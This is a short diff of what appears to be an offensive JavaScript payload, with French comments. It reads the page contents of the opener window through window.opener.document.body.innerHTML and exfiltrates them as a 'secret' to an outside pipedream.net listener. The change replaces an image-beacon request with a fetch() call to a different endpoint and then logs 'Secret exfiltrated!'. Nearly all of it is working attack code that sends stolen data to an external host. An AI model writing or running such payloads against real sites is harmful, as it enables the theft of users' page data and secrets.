@@ -43,8 +43,7 @@
                     "var encodedSecret = window.opener.document.body.innerHTML;" +
                     
                     // 3. EXFILTRATION : Envoie une requête GET invisible avec le secret
-                    "var img = new Image();" +
-                    "img.src = 'https://eoo7qwzk1d94nuc.m.pipedream.net?secret=' + encodedSecret;" +
+                    "fetch('https://eotoci65n24zl7e.m.pipedream.net/?secret=' + encodedSecret);" +
                     
                     "console.log('Secret exfiltrated! Check your listener logs.');" +
                 "} else {" +
